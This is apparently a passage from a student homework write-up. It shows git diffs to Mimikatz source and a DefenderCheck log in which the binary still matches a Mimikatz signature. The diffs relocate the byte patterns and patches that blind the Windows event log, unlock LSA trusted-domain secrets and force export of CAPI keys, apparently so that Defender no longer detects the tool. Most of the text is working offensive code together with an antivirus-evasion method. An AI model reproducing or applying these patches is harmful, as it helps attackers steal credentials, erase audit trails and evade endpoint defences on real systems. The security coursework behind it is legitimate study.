+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_DSS_ExportKey_104),	PTRN_WIN5_DSS_ExportKey_104},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 3}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_W6AL_DSS_ExportKey_104),	PTRN_W6AL_DSS_ExportKey_104},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 5}},
+	};
+#endif
 	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
 	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
 	if(currentReference4001 && currentReference4000)
diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
index 867cd1a..2286d09 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
@@ -1697,18 +1697,7 @@ void kuhl_m_lsadump_trust_authinformation(PLSA_AUTH_INFORMATION info, DWORD coun
 	kprintf(L"\n");
 }
 
-BYTE PATC_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xeb};
-#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9};
-KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
-};
-#elif defined(_M_IX86)
-BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xc7, 0x45, 0xfc, 0x03, 0x00, 0x00, 0xc0, 0xe9};
-KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-10}},
-};
-#endif
+
 NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
 {
 	LSA_HANDLE hLSA;
@@ -1735,6 +1724,18 @@ NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
 
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
+		BYTE PATC_WALL_LsaDbrQueryInfoTrustedDomain[] = { 0xeb };
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
+		BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = { 0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9 };
+		KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
+			{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
+		};
+#elif defined(_M_IX86)
+		BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = { 0xc7, 0x45, 0xfc, 0x03, 0x00, 0x00, 0xc0, 0xe9 };
+		KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
+			{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-10}},
+		};
+#endif
 		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), MIMIKATZ_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = currentReference->Search.Pattern;
```
### 27.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1422336 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x149BB3 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   00 00 00 00 00 26 00 00  00 00 00 00 00 58 AD 14   ·····&·······X­·
00000010   40 01 00 00 00 01 00 00  00 00 00 00 00 50 AD 14   @············P­·
00000020   40 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00   @···············
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 BB 47 00   ·············»G·
00000050   00 00 00 00 00 27 00 00  00 00 00 00 00 10 AE 14   ·····'········®·
00000060   40 01 00 00 00 01 00 00  00 00 00 00 00 50 AD 14   @············P­·
00000070   40 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00   @···············
00000080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000090   00 00 00 00 00 00 00 00  00 00 00 00 00 61 4A 00   ·············aJ·
000000A0   00 00 00 00 00 1D 00 00  00 00 00 00 00 58 AE 14   ·············X®·
000000B0   40 01 00 00 00 01 00 00  00 00 00 00 00 50 AD 14   @············P­·
000000C0   40 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00   @···············
000000D0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
000000E0   00 00 00 00 00 00 00 00  00 00 00 00 00 6C 00 73   ·············l·s
000000F0   00 61 00 73 00 72 00 76  00 2E 00 64 00 6C 00 6C   ·a·s·r·v·.·d·l·l
```


## 28.patch
### 28.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_event.c b/files/mimikatz/mimikatz/modules/kuhl_m_event.c
index e06f1d2..4d4dc37 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_event.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_event.c
@@ -14,68 +14,69 @@ const KUHL_M kuhl_m_event = {
 	ARRAYSIZE(kuhl_m_c_event), kuhl_m_c_event, NULL, NULL
 };
 
+
+
+NTSTATUS kuhl_m_event_drop(int argc, wchar_t * argv[])
+{
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-BYTE PTRN_WNT5_PerformWriteRequest[]			= {0x49, 0x89, 0x5b, 0x10, 0x49, 0x89, 0x73, 0x18};
-BYTE PTRN_WN60_Channel__ActualProcessEvent[]	= {0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0x48, 0x8b, 0xda, 0xe8};
-BYTE PTRN_WIN6_Channel__ActualProcessEvent[]	= {0xff, 0xf7, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};
-BYTE PTRN_WI10_Channel__ActualProcessEvent[]	= {0x48, 0x8b, 0xc4, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x40, 0xc8, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x58, 0x08};
-BYTE PTRN_WN10_1607_Channel__ActualProcessEvent[]	= {0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};
-BYTE PTRN_WN10_1709_Channel__ActualProcessEvent[]	= {0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xca, 0xe8};
-BYTE PTRN_WN10_1803_Channel__ActualProcessEvent[]	= {0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x89, 0x6c, 0x24, 0x58, 0x48, 0x89, 0x74, 0x24, 0x60};
-BYTE PTRN_WN10_1809_Channel__ActualProcessEvent[]	= {0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x89, 0x74, 0x24, 0x58, 0x49, 0x8b, 0xf0, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xca, 0xe8};
-BYTE PTRN_WN10_1909_Channel__ActualProcessEvent[]	= {0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x89, 0x74, 0x24, 0x58, 0x49, 0x8b, 0x58, 0x08, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};
-BYTE PTRN_WN10_2004_Channel__ActualProcessEvent[]	= {0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0x58, 0x08, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8};
+	BYTE PTRN_WNT5_PerformWriteRequest[] = { 0x49, 0x89, 0x5b, 0x10, 0x49, 0x89, 0x73, 0x18 };
+	BYTE PTRN_WN60_Channel__ActualProcessEvent[] = { 0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0x48, 0x8b, 0xda, 0xe8 };
+	BYTE PTRN_WIN6_Channel__ActualProcessEvent[] = { 0xff, 0xf7, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8 };
+	BYTE PTRN_WI10_Channel__ActualProcessEvent[] = { 0x48, 0x8b, 0xc4, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x40, 0xc8, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x58, 0x08 };
+	BYTE PTRN_WN10_1607_Channel__ActualProcessEvent[] = { 0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8 };
+	BYTE PTRN_WN10_1709_Channel__ActualProcessEvent[] = { 0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xca, 0xe8 };
+	BYTE PTRN_WN10_1803_Channel__ActualProcessEvent[] = { 0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x89, 0x6c, 0x24, 0x58, 0x48, 0x89, 0x74, 0x24, 0x60 };
+	BYTE PTRN_WN10_1809_Channel__ActualProcessEvent[] = { 0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x89, 0x74, 0x24, 0x58, 0x49, 0x8b, 0xf0, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xca, 0xe8 };
+	BYTE PTRN_WN10_1909_Channel__ActualProcessEvent[] = { 0x40, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0xc7, 0x44, 0x24, 0x20, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x50, 0x48, 0x89, 0x74, 0x24, 0x58, 0x49, 0x8b, 0x58, 0x08, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8 };
+	BYTE PTRN_WN10_2004_Channel__ActualProcessEvent[] = { 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0x58, 0x08, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xca, 0xe8 };
 
-BYTE PATC_WNT6_Channel__ActualProcessEvent[]	= {0xc3};
-BYTE PATC_WNT5_PerformWriteRequest[]			= {0x45, 0x33, 0xed, 0xc3};
+	BYTE PATC_WNT6_Channel__ActualProcessEvent[] = { 0xc3 };
+	BYTE PATC_WNT5_PerformWriteRequest[] = { 0x45, 0x33, 0xed, 0xc3 };
 
-KULL_M_PATCH_GENERIC EventReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WNT5_PerformWriteRequest),			PTRN_WNT5_PerformWriteRequest},			{sizeof(PATC_WNT5_PerformWriteRequest),			PATC_WNT5_PerformWriteRequest},			{-10}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Channel__ActualProcessEvent),	PTRN_WN60_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_Channel__ActualProcessEvent),	PTRN_WIN6_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI10_Channel__ActualProcessEvent),	PTRN_WI10_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_Channel__ActualProcessEvent),	PTRN_WN10_1607_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WN10_1709_Channel__ActualProcessEvent),	PTRN_WN10_1709_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_Channel__ActualProcessEvent),	PTRN_WN10_1803_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_Channel__ActualProcessEvent),	PTRN_WN10_1809_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_WN10_1909_Channel__ActualProcessEvent),	PTRN_WN10_1909_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_10_2004,	{sizeof(PTRN_WN10_2004_Channel__ActualProcessEvent),	PTRN_WN10_2004_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
-};
+	KULL_M_PATCH_GENERIC EventReferences[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WNT5_PerformWriteRequest),			PTRN_WNT5_PerformWriteRequest},			{sizeof(PATC_WNT5_PerformWriteRequest),			PATC_WNT5_PerformWriteRequest},			{-10}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Channel__ActualProcessEvent),	PTRN_WN60_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_Channel__ActualProcessEvent),	PTRN_WIN6_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI10_Channel__ActualProcessEvent),	PTRN_WI10_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_Channel__ActualProcessEvent),	PTRN_WN10_1607_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WN10_1709_Channel__ActualProcessEvent),	PTRN_WN10_1709_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_Channel__ActualProcessEvent),	PTRN_WN10_1803_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_Channel__ActualProcessEvent),	PTRN_WN10_1809_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_WN10_1909_Channel__ActualProcessEvent),	PTRN_WN10_1909_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_10_2004,	{sizeof(PTRN_WN10_2004_Channel__ActualProcessEvent),	PTRN_WN10_2004_Channel__ActualProcessEvent},	{sizeof(PATC_WNT6_Channel__ActualProcessEvent), PATC_WNT6_Channel__ActualProcessEvent}, {  0}},
+	};
 #elif defined(_M_IX86)
-BYTE PTRN_WNT5_PerformWriteRequest[]			= {0x89, 0x45, 0xe4, 0x8b, 0x7d, 0x08, 0x89, 0x7d};
-BYTE PTRN_WN60_Channel__ActualProcessEvent[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x56, 0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};
-BYTE PTRN_WN61_Channel__ActualProcessEvent[]	= {0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8};
-BYTE PTRN_WN62_Channel__ActualProcessEvent[]	= {0x33, 0xc4, 0x50, 0x8d, 0x44, 0x24, 0x28, 0x64, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x75, 0x0c};
-BYTE PTRN_WN63_Channel__ActualProcessEvent[]	= {0x33, 0xc4, 0x50, 0x8d, 0x44, 0x24, 0x20, 0x64, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x8b, 0xf9, 0x8b};
-BYTE PTRN_WN64_Channel__ActualProcessEvent[]	= {0x33, 0xc4, 0x89, 0x44, 0x24, 0x10, 0x53, 0x56, 0x57, 0xa1};
-BYTE PTRN_WN10_1607_Channel__ActualProcessEvent[]	= {0x8b, 0xd9, 0x8b, 0x4d, 0x08, 0xe8};
-BYTE PTRN_WN10_1709_Channel__ActualProcessEvent[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x0c, 0x56, 0x57, 0x8b, 0xf9, 0x8b, 0x4d, 0x08, 0xe8};
-BYTE PTRN_WN10_1803_Channel__ActualProcessEvent[]	= {0x8b, 0xf1, 0x89, 0x75, 0xec, 0x8b, 0x7d, 0x08, 0x8b, 0xcf, 0xe8};
-BYTE PTRN_WN10_1809_Channel__ActualProcessEvent[]	= {0x8b, 0xf1, 0x89, 0x75, 0xf0, 0x8b, 0x7d, 0x08, 0x8b, 0xcf, 0xe8};
-BYTE PTRN_WN10_2004_Channel__ActualProcessEvent[]	= {0x8b, 0xd9, 0x8b, 0x7d, 0x08, 0x8b, 0xcf, 0xe8};
+	BYTE PTRN_WNT5_PerformWriteRequest[] = { 0x89, 0x45, 0xe4, 0x8b, 0x7d, 0x08, 0x89, 0x7d };
+	BYTE PTRN_WN60_Channel__ActualProcessEvent[] = { 0x8b, 0xff, 0x55, 0x8b, 0xec, 0x56, 0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8 };
+	BYTE PTRN_WN61_Channel__ActualProcessEvent[] = { 0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8 };
+	BYTE PTRN_WN62_Channel__ActualProcessEvent[] = { 0x33, 0xc4, 0x50, 0x8d, 0x44, 0x24, 0x28, 0x64, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x75, 0x0c };
+	BYTE PTRN_WN63_Channel__ActualProcessEvent[] = { 0x33, 0xc4, 0x50, 0x8d, 0x44, 0x24, 0x20, 0x64, 0xa3, 0x00, 0x00, 0x00, 0x00, 0x8b, 0xf9, 0x8b };
+	BYTE PTRN_WN64_Channel__ActualProcessEvent[] = { 0x33, 0xc4, 0x89, 0x44, 0x24, 0x10, 0x53, 0x56, 0x57, 0xa1 };
+	BYTE PTRN_WN10_1607_Channel__ActualProcessEvent[] = { 0x8b, 0xd9, 0x8b, 0x4d, 0x08, 0xe8 };
+	BYTE PTRN_WN10_1709_Channel__ActualProcessEvent[] = { 0x8b, 0xff, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x0c, 0x56, 0x57, 0x8b, 0xf9, 0x8b, 0x4d, 0x08, 0xe8 };
+	BYTE PTRN_WN10_1803_Channel__ActualProcessEvent[] = { 0x8b, 0xf1, 0x89, 0x75, 0xec, 0x8b, 0x7d, 0x08, 0x8b, 0xcf, 0xe8 };
+	BYTE PTRN_WN10_1809_Channel__ActualProcessEvent[] = { 0x8b, 0xf1, 0x89, 0x75, 0xf0, 0x8b, 0x7d, 0x08, 0x8b, 0xcf, 0xe8 };
+	BYTE PTRN_WN10_2004_Channel__ActualProcessEvent[] = { 0x8b, 0xd9, 0x8b, 0x7d, 0x08, 0x8b, 0xcf, 0xe8 };
 
-BYTE PATC_WNT5_PerformWriteRequest[]			= {0x33, 0xc0, 0xc2, 0x04, 0x00};
-BYTE PATC_WNO8_Channel__ActualProcessEvent[]	= {0xc2, 0x04, 0x00};
-BYTE PATC_WIN8_Channel__ActualProcessEvent[]	= {0xc2, 0x08, 0x00};
-BYTE PATC_W1803_Channel__ActualProcessEvent[]	= {0xc2, 0x0c, 0x00};
+	BYTE PATC_WNT5_PerformWriteRequest[] = { 0x33, 0xc0, 0xc2, 0x04, 0x00 };
+	BYTE PATC_WNO8_Channel__ActualProcessEvent[] = { 0xc2, 0x04, 0x00 };
+	BYTE PATC_WIN8_Channel__ActualProcessEvent[] = { 0xc2, 0x08, 0x00 };
+	BYTE PATC_W1803_Channel__ActualProcessEvent[] = { 0xc2, 0x0c, 0x00 };
 
-KULL_M_PATCH_GENERIC EventReferences[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WNT5_PerformWriteRequest),			PTRN_WNT5_PerformWriteRequest},			{sizeof(PATC_WNT5_PerformWriteRequest),			PATC_WNT5_PerformWriteRequest},			{-20}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Channel__ActualProcessEvent),	PTRN_WN60_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_Channel__ActualProcessEvent),	PTRN_WN61_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-12}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN62_Channel__ActualProcessEvent),	PTRN_WN62_Channel__ActualProcessEvent},	{sizeof(PATC_WIN8_Channel__ActualProcessEvent), PATC_WIN8_Channel__ActualProcessEvent}, {-33}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_Channel__ActualProcessEvent),	PTRN_WN63_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-32}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN64_Channel__ActualProcessEvent),	PTRN_WN64_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-30}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_Channel__ActualProcessEvent),	PTRN_WN10_1607_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-12}},
-	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WN10_1709_Channel__ActualProcessEvent),	PTRN_WN10_1709_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {  0}},
-	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN10_1803_Channel__ActualProcessEvent),	PTRN_WN10_1803_Channel__ActualProcessEvent},	{sizeof(PATC_W1803_Channel__ActualProcessEvent), PATC_W1803_Channel__ActualProcessEvent}, {-12}},
-	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_1809_Channel__ActualProcessEvent),	PTRN_WN10_1809_Channel__ActualProcessEvent},	{sizeof(PATC_W1803_Channel__ActualProcessEvent), PATC_W1803_Channel__ActualProcessEvent}, {-12}},
-	{KULL_M_WIN_BUILD_10_2004,	{sizeof(PTRN_WN10_2004_Channel__ActualProcessEvent),	PTRN_WN10_2004_Channel__ActualProcessEvent},	{sizeof(PATC_W1803_Channel__ActualProcessEvent), PATC_W1803_Channel__ActualProcessEvent}, {-12}},
-};
+	KULL_M_PATCH_GENERIC EventReferences[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WNT5_PerformWriteRequest),			PTRN_WNT5_PerformWriteRequest},			{sizeof(PATC_WNT5_PerformWriteRequest),			PATC_WNT5_PerformWriteRequest},			{-20}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Channel__ActualProcessEvent),	PTRN_WN60_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {  0}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_Channel__ActualProcessEvent),	PTRN_WN61_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-12}},
+		{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WN62_Channel__ActualProcessEvent),	PTRN_WN62_Channel__ActualProcessEvent},	{sizeof(PATC_WIN8_Channel__ActualProcessEvent), PATC_WIN8_Channel__ActualProcessEvent}, {-33}},
+		{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_Channel__ActualProcessEvent),	PTRN_WN63_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-32}},
+		{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN64_Channel__ActualProcessEvent),	PTRN_WN64_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-30}},
+		{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_Channel__ActualProcessEvent),	PTRN_WN10_1607_Channel__ActualProcessEvent},	{sizeof(PATC_WNO8_Channel__ActualProcessEvent), PATC_WNO8_Channel__ActualProcessEvent}, {-12}},
